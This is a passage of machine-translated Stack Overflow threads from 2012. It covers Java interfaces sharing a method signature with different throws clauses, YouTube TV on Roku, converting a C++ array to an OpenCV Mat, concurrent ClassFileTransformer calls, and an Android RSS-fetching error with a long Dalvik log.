> 时间：2012-10-06T14:18:58.693

您不会收到不同的异常，因为`ExceptionInherit`extends `ExceptionSuper`。但是考虑一下：

```
interface X {
    public void foo() throws ExceptionA;
}

interface Y {
    public void foo() throws ExceptionB;
}

class ExceptionA extends Exception {}
class ExceptionB extends Exception {}

class Z implements X, Y {
    public void foo() throws ExceptionA {

    }
} 
```

注意如何通过继承连接`ExceptionA`和`ExceptionB`不连接。在这种情况下，您将收到一个编译错误，因为它`ExceptionA`与.`throws``Y`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-06T15:12:41.620

它可以在没有泛型的情况下工作，也没有例外。甚至可以追溯到 Java 1.4，而且可能更早。

> 我一直认为具有相同方法的两个接口不能被一个类继承，正如许多问题中所述。

这实际上不是真的，我不确定你指的是什么问题。

不使用具有相同方法签名的两个接口当然是有原因的，最重要的是实现只能做一件事，所以如果两个接口期望从方法得到不同的结果，你将无法同时满足两个接口，但这不会是编译错误。

有两个接口具有相同的方法是完全有效的，这也是有原因的。如果 2 个接口相互扩展，则一个实现可以很好地实现这两个接口。即使在接口只是共享名称的更简单的情况下，也没有技术限制。

一个接口只要求某些方法可用，它不要求其他接口不存在。

有效代码：

```
public interface IDo {
    public void does();
}

public interface ITwo {
    public void does();
}

public class Test implements IDo, ITwo {
public void does() {
}
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-06T17:12:01.327

```
I always thought that two interfaces with the same method cannot 
be inherited by one class, as stated in many so questions. 
```

如果您想更精确，您应该将“相同方法”替换为“**具有覆盖等效签名的方法**”。签名是“方法名称”+“参数列表”（一些规则也适用于返回类型和 throws 子句）。您需要知道 override-equivalent 的确切含义。

**如果一个类使用这样的方法实现两个或多个接口，那很好，前提是：**

**1-它们都具有相同的返回类型或其中一个方法的返回类型是所有其他方法的子类型。这是您应该在实现中使用的返回类型。**

例如：

```
interface A {
    Integer x();
}

interface B {
    Number x();
}

interface C {
    Object x();
}

class Foo implements A, B, C
{
    Integer x() { 
        //...
    }
} 
```

和

**2- 实现**必须**满足每个超接口声明的所有此类方法的 throws 子句。**

因此，您提供的示例符合这些规则，并且完全可以执行。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-06T14:39:38.567

您绝对可以“实现”两个具有相同签名方法的接口。尝试“扩展”两个具有相同方法实现的类时会遇到麻烦。多接口继承是好的；多重实现继承很棘手。

可以使用“ExceptionInherit”对象代替“ExceptionSuper”对象，因为它继承自它。“ExceptionInherit”对象具有“ExceptionSuper”对象所做的所有信息（以及更多信息）。反过来，情况并非如此。您不能使用“ExceptionSuper”对象代替“ExceptionInherit”对象，因为“ExceptionInherit”代码期望的比您的基本对象拥有的更多（好吧，可能但不是您的情况）。

您对“create”方法的实现填充了 ICreateUser“create”签名，因为它抛出了一个“ExceptionInherit”，可以将其抛出给“ExceptionInherit”和“ExceptionSuper”的捕获器，从中获取他们需要的所有信息（只是基类）物体。

你不能改变你的实现来抛出一个“ExceptionSuper”，因为期待一个“ExceptionInherit”的捕手会得到一个没有足够信息的对象。

# youtube-api - YouTube 电视 | 询问

> ID：12760512
> 
> 赞同：1
> 
> 时间：2012-10-06T14:09:06.360
> 
> 标签：youtube-api

Roku 何时可以使用 YouTube 电视？它是免费的，我不明白关于它在设备上不可用的问题是什么。

你能解释一下吗？

如果它正在开发中，我们什么时候可以期待它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T20:41:21.897

这个问题可能与 YouTube 方面的广告收入有关，并且看到 Roku 拥有超过 200 万用户，数据流的成本只能用广告收入的钱来代替，或者相反，1 个视频可以在 1 个中获得 200 万次观看天和广告提供商可能会因需要快速支付而陷入贴纸震惊。但不要引用我的话。

# c++ - 如何将多维 c++ 数组转换为 openCV 形式？

> ID：12760513
> 
> 赞同：-1
> 
> 时间：2012-10-06T14:09:08.400
> 
> 标签：c++, arrays, opencv, multidimensional-array, type-conversion

> **可能重复：**
> [将数据从一个矩阵复制到另一个矩阵](https://stackoverflow.com/questions/12617308/copy-data-from-one-matrix-to-another)

我在 C++ 中有一个这样的数组：

```
double myValue[600][800][3]; 
```

我想把它转换成openCV多维矩阵或标量形式。我试着做这样的事情：

```
double size[] = {600, 800};
cv::Mat myValue (size, 3, CV_8UC3 ); 
```

但这是错误的，有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T16:36:26.967

哥们，在提问之前，您必须通过查看手册或搜索网络来进行基础研究。如果你不这样做，我们很难给你一个可以理解的答案。

访问 cv::Mat 或矩阵转换的元素是 OpenCV 中的基本内容。[如果您很忙，](http://opencv.willowgarage.com/wiki/Welcome?action=AttachFile&do=get&target=opencv_cheatsheet.pdf)请参阅备忘单。

要回答您的问题，我认为将多维数组转换为 Mat 没有捷径。您应该遍历元素以将数据复制到 Mat 中。这就是为什么许多人使用一维数组来加快速度以加快图像处理的速度。

# java - Java - ClassFileTransformer.transform(...) 对同一类加载器和类名对的并发调用

> ID：12760515
> 
> 赞同：2
> 
> 时间：2012-10-06T14:09:14.223
> 
> 标签：java, concurrency, transform, instrumentation

方法 ClassFileTransformer.transform(ClassLoader classLoader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) 的 J2SE 5.0 规范告诉：

> 每一个新的类定义和每一个类的重新定义都会调用transformer。使用 ClassLoader.defineClass 请求新的类定义。使用 Instrumentation.redefineClasses 或其本机等效项提出类重定义请求。在验证或应用类文件字节之前，在处理请求期间调用转换器。

使用这些信息，我不能说是否可以为同一个运行时类（classLoader&className）同时调用方法 ClassFileTransformer.transform。我知道可以为同一个类同时调用 Instrumentation.redefineClasses 方法，但这并不意味着这样的调用会导致对同一个类同时调用 ClassFileTransformer.transform。有什么办法可以澄清我的不理解吗？

这对我来说很重要，因为我使用 Javassist 进行转换，并且可以从同时运行的方法 ClassFileTransformer.transform 中使用相同的 CtClass 实例。目前我在 synchronized(ctClass) 块中使用 CtClass 实例，以防万一。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T02:22:28.840

我只是尝试`Instrumentation.redefineClasses`为同一个类同时调用方法，并检查我的类文件转换器`transform`方法是否被同时调用。答案是肯定`ClassFileTransformer.transform`的，JVM 可以同时为同一个类调用方法。

# android - Android RSS 订阅

> ID：12760516
> 
> 赞同：0
> 
> 时间：2012-10-06T14:09:15.663
> 
> 标签：android, http, rss

当我尝试连接以读取 rss 提要时，我的 android 应用程序出现问题，有时它可以工作，有时它只适用于模拟器，不适用于设备！

```
package com.itgrapes.rss;

public class ContainerData {    

static public Context context;

public ContainerData() {

}

public static ArrayList<Feed> getFeeds(String urlPage){
    URL url=null;
    SAXParserFactory fabrique = SAXParserFactory.newInstance();
    SAXParser parseur = null;
    ArrayList<Feed> feeds = null;
    try {
        parseur = fabrique.newSAXParser();
    } catch (ParserConfigurationException e) {
        e.printStackTrace();
    } catch (SAXException e) {
        e.printStackTrace();
    }

    try {
        url = new URL(urlPage);
    } catch (MalformedURLException e1) {
        e1.printStackTrace();
    }

    DefaultHandler handler = new ParserXMLHandler();
    try {
        parseur.parse(url.openConnection().getInputStream(), handler);
        feeds = ((ParserXMLHandler) handler).getData();
    } catch (SAXException e) {
        Log.i("SAXException", "SAXException");
        e.printStackTrace();
    } catch (IOException e) {
        Log.i("IOException", "IOException");
        e.printStackTrace();
    }

    return feeds;
}

} 
```

这是日志。

```
 10-06 14:01:57.991: D/dalvikvm(414): GC_EXTERNAL_ALLOC freed 70K, 52% free 2612K/5379K, external 1896K/2137K, paused 105ms
        10-06 14:02:08.772: I/dalvikvm(414): Could not find method com.actionbarsherlock.internal.nineoldandroids.widget.NineFrameLayout.onHoverEvent, referenced from method com.actionbarsherlock.internal.widget.ActionBarContainer.onHoverEvent
        10-06 14:02:08.772: W/dalvikvm(414): VFY: unable to resolve virtual method 4164: Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineFrameLayout;.onHoverEvent (Landroid/view/MotionEvent;)Z
        10-06 14:02:08.781: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x0000
        10-06 14:02:08.781: D/dalvikvm(414): VFY: dead code 0x0003-0004 in Lcom/actionbarsherlock/internal/widget/ActionBarContainer;.onHoverEvent (Landroid/view/MotionEvent;)Z
        10-06 14:02:08.812: I/dalvikvm(414): Could not find method android.widget.FrameLayout.getAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineFrameLayout.getAlpha
        10-06 14:02:08.812: W/dalvikvm(414): VFY: unable to resolve virtual method 2935: Landroid/widget/FrameLayout;.getAlpha ()F
        10-06 14:02:08.812: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:08.826: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineFrameLayout;.getAlpha ()F
        10-06 14:02:08.826: I/dalvikvm(414): Could not find method android.widget.FrameLayout.getTranslationY, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineFrameLayout.getTranslationY
        10-06 14:02:08.832: W/dalvikvm(414): VFY: unable to resolve virtual method 2936: Landroid/widget/FrameLayout;.getTranslationY ()F
        10-06 14:02:08.832: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:08.832: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineFrameLayout;.getTranslationY ()F
        10-06 14:02:08.832: I/dalvikvm(414): Could not find method android.widget.FrameLayout.setAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineFrameLayout.setAlpha
        10-06 14:02:08.832: W/dalvikvm(414): VFY: unable to resolve virtual method 2939: Landroid/widget/FrameLayout;.setAlpha (F)V
        10-06 14:02:08.832: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:08.832: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineFrameLayout;.setAlpha (F)V
        10-06 14:02:08.832: I/dalvikvm(414): Could not find method android.widget.FrameLayout.setTranslationY, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineFrameLayout.setTranslationY
        10-06 14:02:08.843: W/dalvikvm(414): VFY: unable to resolve virtual method 2947: Landroid/widget/FrameLayout;.setTranslationY (F)V
        10-06 14:02:08.843: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:08.843: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineFrameLayout;.setTranslationY (F)V
        10-06 14:02:08.882: I/dalvikvm(414): Could not find method android.view.ViewGroup.getAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.getAlpha
        10-06 14:02:08.882: W/dalvikvm(414): VFY: unable to resolve virtual method 2717: Landroid/view/ViewGroup;.getAlpha ()F
        10-06 14:02:08.891: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:08.891: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.getAlpha ()F
        10-06 14:02:08.903: I/dalvikvm(414): Could not find method android.view.ViewGroup.getTranslationX, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.getTranslationX
        10-06 14:02:08.903: W/dalvikvm(414): VFY: unable to resolve virtual method 2723: Landroid/view/ViewGroup;.getTranslationX ()F
        10-06 14:02:08.903: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:08.903: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.getTranslationX ()F
        10-06 14:02:08.922: I/dalvikvm(414): Could not find method android.view.ViewGroup.getTranslationY, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.getTranslationY
        10-06 14:02:08.922: W/dalvikvm(414): VFY: unable to resolve virtual method 2724: Landroid/view/ViewGroup;.getTranslationY ()F
        10-06 14:02:08.922: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:08.943: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.getTranslationY ()F
        10-06 14:02:08.943: I/dalvikvm(414): Could not find method android.view.ViewGroup.setAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.setAlpha
        10-06 14:02:08.943: W/dalvikvm(414): VFY: unable to resolve virtual method 2739: Landroid/view/ViewGroup;.setAlpha (F)V
        10-06 14:02:08.952: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:08.952: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.setAlpha (F)V
        10-06 14:02:08.962: I/dalvikvm(414): Could not find method android.view.ViewGroup.setTranslationX, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.setTranslationX
        10-06 14:02:08.962: W/dalvikvm(414): VFY: unable to resolve virtual method 2743: Landroid/view/ViewGroup;.setTranslationX (F)V
        10-06 14:02:08.962: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:08.962: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.setTranslationX (F)V
        10-06 14:02:08.962: I/dalvikvm(414): Could not find method android.view.ViewGroup.setTranslationY, referenced from method com.actionbarsherlock.internal.nineoldandroids.view.NineViewGroup.setTranslationY
        10-06 14:02:08.962: W/dalvikvm(414): VFY: unable to resolve virtual method 2744: Landroid/view/ViewGroup;.setTranslationY (F)V
        10-06 14:02:08.962: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:08.962: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/view/NineViewGroup;.setTranslationY (F)V
        10-06 14:02:09.072: I/dalvikvm(414): Could not find method com.actionbarsherlock.internal.widget.ActionBarView$HomeView.onHoverEvent, referenced from method com.actionbarsherlock.internal.widget.ActionBarView$HomeView.dispatchHoverEvent
        10-06 14:02:09.072: W/dalvikvm(414): VFY: unable to resolve virtual method 5024: Lcom/actionbarsherlock/internal/widget/ActionBarView$HomeView;.onHoverEvent (Landroid/view/MotionEvent;)Z
        10-06 14:02:09.072: D/dalvikvm(414): VFY: replacing opcode 0x6e at 0x0000
        10-06 14:02:09.072: D/dalvikvm(414): VFY: dead code 0x0003-0004 in Lcom/actionbarsherlock/internal/widget/ActionBarView$HomeView;.dispatchHoverEvent (Landroid/view/MotionEvent;)Z
        10-06 14:02:09.102: I/dalvikvm(414): Could not find method android.widget.FrameLayout.onPopulateAccessibilityEvent, referenced from method com.actionbarsherlock.internal.widget.ActionBarView$HomeView.onPopulateAccessibilityEvent
        10-06 14:02:09.102: W/dalvikvm(414): VFY: unable to resolve virtual method 2938: Landroid/widget/FrameLayout;.onPopulateAccessibilityEvent (Landroid/view/accessibility/AccessibilityEvent;)V
        10-06 14:02:09.102: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x0006
        10-06 14:02:09.302: I/dalvikvm(414): Could not find method android.widget.HorizontalScrollView.getAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineHorizontalScrollView.getAlpha
        10-06 14:02:09.302: W/dalvikvm(414): VFY: unable to resolve virtual method 2950: Landroid/widget/HorizontalScrollView;.getAlpha ()F
        10-06 14:02:09.302: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:09.312: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineHorizontalScrollView;.getAlpha ()F
        10-06 14:02:09.312: I/dalvikvm(414): Could not find method android.widget.HorizontalScrollView.setAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineHorizontalScrollView.setAlpha
        10-06 14:02:09.312: W/dalvikvm(414): VFY: unable to resolve virtual method 2951: Landroid/widget/HorizontalScrollView;.setAlpha (F)V
        10-06 14:02:09.312: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:09.322: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineHorizontalScrollView;.setAlpha (F)V
        10-06 14:02:09.512: I/dalvikvm(414): Could not find method android.widget.LinearLayout.<init>, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineLinearLayout.<init>
        10-06 14:02:09.512: W/dalvikvm(414): VFY: unable to resolve direct method 2987: Landroid/widget/LinearLayout;.<init> (Landroid/content/Context;Landroid/util/AttributeSet;I)V
        10-06 14:02:09.512: D/dalvikvm(414): VFY: replacing opcode 0x70 at 0x0000
        10-06 14:02:09.512: D/dalvikvm(414): VFY: dead code 0x0003-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineLinearLayout;.<init> (Landroid/content/Context;Landroid/util/AttributeSet;I)V
        10-06 14:02:09.512: I/dalvikvm(414): Could not find method android.widget.LinearLayout.getAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineLinearLayout.getAlpha
        10-06 14:02:09.523: W/dalvikvm(414): VFY: unable to resolve virtual method 2991: Landroid/widget/LinearLayout;.getAlpha ()F
        10-06 14:02:09.523: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:09.532: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineLinearLayout;.getAlpha ()F
        10-06 14:02:09.532: I/dalvikvm(414): Could not find method android.widget.LinearLayout.getTranslationX, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineLinearLayout.getTranslationX
        10-06 14:02:09.532: W/dalvikvm(414): VFY: unable to resolve virtual method 2994: Landroid/widget/LinearLayout;.getTranslationX ()F
        10-06 14:02:09.532: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000b
        10-06 14:02:09.532: D/dalvikvm(414): VFY: dead code 0x000e-000f in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineLinearLayout;.getTranslationX ()F
        10-06 14:02:09.532: I/dalvikvm(414): Could not find method android.widget.LinearLayout.setAlpha, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineLinearLayout.setAlpha
        10-06 14:02:09.532: W/dalvikvm(414): VFY: unable to resolve virtual method 3001: Landroid/widget/LinearLayout;.setAlpha (F)V
        10-06 14:02:09.542: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:09.542: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineLinearLayout;.setAlpha (F)V
        10-06 14:02:09.542: I/dalvikvm(414): Could not find method android.widget.LinearLayout.setTranslationX, referenced from method com.actionbarsherlock.internal.nineoldandroids.widget.NineLinearLayout.setTranslationX
        10-06 14:02:09.542: W/dalvikvm(414): VFY: unable to resolve virtual method 3007: Landroid/widget/LinearLayout;.setTranslationX (F)V
        10-06 14:02:09.542: D/dalvikvm(414): VFY: replacing opcode 0x6f at 0x000a
        10-06 14:02:09.542: D/dalvikvm(414): VFY: dead code 0x000d-000d in Lcom/actionbarsherlock/internal/nineoldandroids/widget/NineLinearLayout;.setTranslationX (F)V
        10-06 14:02:29.956: I/IOException(414): IOException
        10-06 14:02:29.956: W/System.err(414): java.net.UnknownHostException: www.mille-et-une-tunisie.com
        10-06 14:02:29.981: W/System.err(414):  at java.net.InetAddress.lookupHostByName(InetAddress.java:506)
        10-06 14:02:29.981: W/System.err(414):  at java.net.InetAddress.getAllByNameImpl(InetAddress.java:294)
        10-06 14:02:29.981: W/System.err(414):  at java.net.InetAddress.getAllByName(InetAddress.java:256)
        10-06 14:02:29.981: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection.<init>(HttpConnection.java:69)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection.<init>(HttpConnection.java:48)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection$Address.connect(HttpConnection.java:322)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnectionPool.get(HttpConnectionPool.java:89)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.getHttpConnection(HttpURLConnectionImpl.java:285)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.makeConnection(HttpURLConnectionImpl.java:267)
        10-06 14:02:29.991: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.retrieveResponse(HttpURLConnectionImpl.java:1018)
        10-06 14:02:30.001: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:512)
        10-06 14:02:30.001: W/System.err(414):  at com.itgrapes.rss.ContainerData.getFeeds(ContainerData.java:50)
        10-06 14:02:30.011: W/System.err(414):  at com.itgrapes.fragment.FeedPlayerIndexFragment.<init>(FeedPlayerIndexFragment.java:24)
        10-06 14:02:30.011: W/System.err(414):  at java.lang.Class.newInstanceImpl(Native Method)
        10-06 14:02:30.011: W/System.err(414):  at java.lang.Class.newInstance(Class.java:1409)
        10-06 14:02:30.011: W/System.err(414):  at android.support.v4.app.Fragment.instantiate(Fragment.java:384)
        10-06 14:02:30.011: W/System.err(414):  at com.itgrapes.viewpager.FragmentsSliderActivity$TabsAdapter.getItem(FragmentsSliderActivity.java:103)
        10-06 14:02:30.011: W/System.err(414):  at com.itgrapes.viewpager.FragmentsSliderActivity$TabsAdapter.getItem(FragmentsSliderActivity.java:1)
        10-06 14:02:30.011: W/System.err(414):  at android.support.v4.app.FragmentPagerAdapter.instantiateItem(FragmentPagerAdapter.java:95)
        10-06 14:02:30.011: W/System.err(414):  at android.support.v4.view.ViewPager.addNewItem(ViewPager.java:649)
        10-06 14:02:30.011: W/System.err(414):  at android.support.v4.view.ViewPager.populate(ViewPager.java:783)
        10-06 14:02:30.021: W/System.err(414):  at android.support.v4.view.ViewPager.onMeasure(ViewPager.java:1016)
        10-06 14:02:30.021: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.021: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.021: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.021: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.021: W/System.err(414):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:531)
        10-06 14:02:30.021: W/System.err(414):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:309)
        10-06 14:02:30.031: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.031: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.031: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.031: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.031: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.031: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.041: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.041: W/System.err(414):  at android.view.ViewRoot.performTraversals(ViewRoot.java:839)
        10-06 14:02:30.041: W/System.err(414):  at android.view.ViewRoot.handleMessage(ViewRoot.java:1859)
        10-06 14:02:30.041: W/System.err(414):  at android.os.Handler.dispatchMessage(Handler.java:99)
        10-06 14:02:30.041: W/System.err(414):  at android.os.Looper.loop(Looper.java:123)
        10-06 14:02:30.041: W/System.err(414):  at android.app.ActivityThread.main(ActivityThread.java:3683)
        10-06 14:02:30.052: W/System.err(414):  at java.lang.reflect.Method.invokeNative(Native Method)
        10-06 14:02:30.052: W/System.err(414):  at java.lang.reflect.Method.invoke(Method.java:507)
        10-06 14:02:30.052: W/System.err(414):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
        10-06 14:02:30.052: W/System.err(414):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
        10-06 14:02:30.052: W/System.err(414):  at dalvik.system.NativeStart.main(Native Method)
        10-06 14:02:30.062: I/IOException(414): IOException
        10-06 14:02:30.062: W/System.err(414): java.net.UnknownHostException: www.mille-et-une-tunisie.com
        10-06 14:02:30.072: W/System.err(414):  at java.net.InetAddress.lookupHostByName(InetAddress.java:497)
        10-06 14:02:30.082: W/System.err(414):  at java.net.InetAddress.getAllByNameImpl(InetAddress.java:294)
        10-06 14:02:30.082: W/System.err(414):  at java.net.InetAddress.getAllByName(InetAddress.java:256)
        10-06 14:02:30.082: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection.<init>(HttpConnection.java:69)
        10-06 14:02:30.082: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection.<init>(HttpConnection.java:48)
        10-06 14:02:30.082: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnection$Address.connect(HttpConnection.java:322)
        10-06 14:02:30.082: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpConnectionPool.get(HttpConnectionPool.java:89)
        10-06 14:02:30.082: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.getHttpConnection(HttpURLConnectionImpl.java:285)
        10-06 14:02:30.092: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.makeConnection(HttpURLConnectionImpl.java:267)
        10-06 14:02:30.092: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.retrieveResponse(HttpURLConnectionImpl.java:1018)
        10-06 14:02:30.092: W/System.err(414):  at org.apache.harmony.luni.internal.net.www.protocol.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:512)
        10-06 14:02:30.092: W/System.err(414):  at com.itgrapes.rss.ContainerData.getFeeds(ContainerData.java:50)
        10-06 14:02:30.092: W/System.err(414):  at com.itgrapes.fragment.FeedPlayerHebergementFragment.<init>(FeedPlayerHebergementFragment.java:24)
        10-06 14:02:30.102: W/System.err(414):  at java.lang.Class.newInstanceImpl(Native Method)
        10-06 14:02:30.102: W/System.err(414):  at java.lang.Class.newInstance(Class.java:1409)
        10-06 14:02:30.112: W/System.err(414):  at android.support.v4.app.Fragment.instantiate(Fragment.java:384)
        10-06 14:02:30.112: W/System.err(414):  at com.itgrapes.viewpager.FragmentsSliderActivity$TabsAdapter.getItem(FragmentsSliderActivity.java:103)
        10-06 14:02:30.112: W/System.err(414):  at com.itgrapes.viewpager.FragmentsSliderActivity$TabsAdapter.getItem(FragmentsSliderActivity.java:1)
        10-06 14:02:30.112: W/System.err(414):  at android.support.v4.app.FragmentPagerAdapter.instantiateItem(FragmentPagerAdapter.java:95)
        10-06 14:02:30.112: W/System.err(414):  at android.support.v4.view.ViewPager.addNewItem(ViewPager.java:649)
        10-06 14:02:30.112: W/System.err(414):  at android.support.v4.view.ViewPager.populate(ViewPager.java:783)
        10-06 14:02:30.112: W/System.err(414):  at android.support.v4.view.ViewPager.onMeasure(ViewPager.java:1016)
        10-06 14:02:30.122: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.122: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.122: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.122: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.158: W/System.err(414):  at android.widget.LinearLayout.measureVertical(LinearLayout.java:531)
        10-06 14:02:30.162: W/System.err(414):  at android.widget.LinearLayout.onMeasure(LinearLayout.java:309)
        10-06 14:02:30.162: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.162: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.171: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.171: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.171: W/System.err(414):  at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
        10-06 14:02:30.171: W/System.err(414):  at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
        10-06 14:02:30.181: W/System.err(414):  at android.view.View.measure(View.java:8313)
        10-06 14:02:30.181: W/System.err(414):  at android.view.ViewRoot.performTraversals(ViewRoot.java:839)
        10-06 14:02:30.181: W/System.err(414):  at android.view.ViewRoot.handleMessage(ViewRoot.java:1859)
        10-06 14:02:30.181: W/System.err(414):  at android.os.Handler.dispatchMessage(Handler.java:99)
        10-06 14:02:30.181: W/System.err(414):  at android.os.Looper.loop(Looper.java:123)
        10-06 14:02:30.181: W/System.err(414):  at android.app.ActivityThread.main(ActivityThread.java:3683)
        10-06 14:02:30.181: W/System.err(414):  at java.lang.reflect.Method.invokeNative(Native Method)
        10-06 14:02:30.181: W/System.err(414):  at java.lang.reflect.Method.invoke(Method.java:507)
